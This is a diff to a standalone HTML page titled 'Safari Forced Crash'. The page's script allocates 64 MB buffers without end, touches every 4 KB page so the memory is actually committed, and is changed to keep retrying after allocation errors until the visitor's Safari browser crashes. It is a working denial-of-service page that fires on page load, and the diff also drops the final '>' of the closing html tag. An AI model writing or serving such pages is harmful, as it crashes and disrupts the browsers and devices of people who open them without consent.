@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Safari Chunked Crash</title>
+  <title>Safari Forced Crash</title>
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <style>
     body {
@@ -23,33 +23,46 @@
   </style>
 </head>
 <body>
-  <h1>Crashing in Chunks…</h1>
+  <h1>🚨 Forcing Safari Crash…</h1>
   <p id="counter">Allocated: 0 MB</p>
 
   <script>
-    (function chunkedCrash() {
+    (function forcedCrash(){
       const allocations = [];
-      const CHUNK_MB = 256;         // 256 MB per buffer
-      let totalMB = 0;              // cumulative total
+      const CHUNK_MB = 64;               // 64 MB per buffer
+      const PAGE_SIZE = 4 * 1024;        // touch every 4 KB page
+      let totalMB = 0;
 
       function step() {
         try {
-          allocations.push(new ArrayBuffer(CHUNK_MB * 1024 * 1024));
+          // 1) Allocate
+          const buf = new ArrayBuffer(CHUNK_MB * 1024 * 1024);
+          const view = new Uint8Array(buf);
+
+          // 2) Touch every 4 KB so memory is really committed
+          for (let i = 0; i < view.length; i += PAGE_SIZE) {
+            view[i] = 1;
+          }
+
+          // 3) Store and update counter
+          allocations.push(buf);
           totalMB += CHUNK_MB;
           document.getElementById('counter').textContent =
             `Allocated: ${totalMB.toLocaleString()} MB`;
 
+          // 4) Next iteration ASAP
           window.requestAnimationFrame(step);
 
         } catch (e) {
-          document.getElementById('counter').textContent +=
-            ' (hit buffer limit)';
-          console.error('Allocation error:', e);
+          // If ArrayBuffer itself fails, log but keep hammering
+          console.warn('Buffer allocation error:', e);
+          window.requestAnimationFrame(step);
         }
       }
 
+      // start
       step();
     })();
   </script>
 </body>
-</html>
+</html
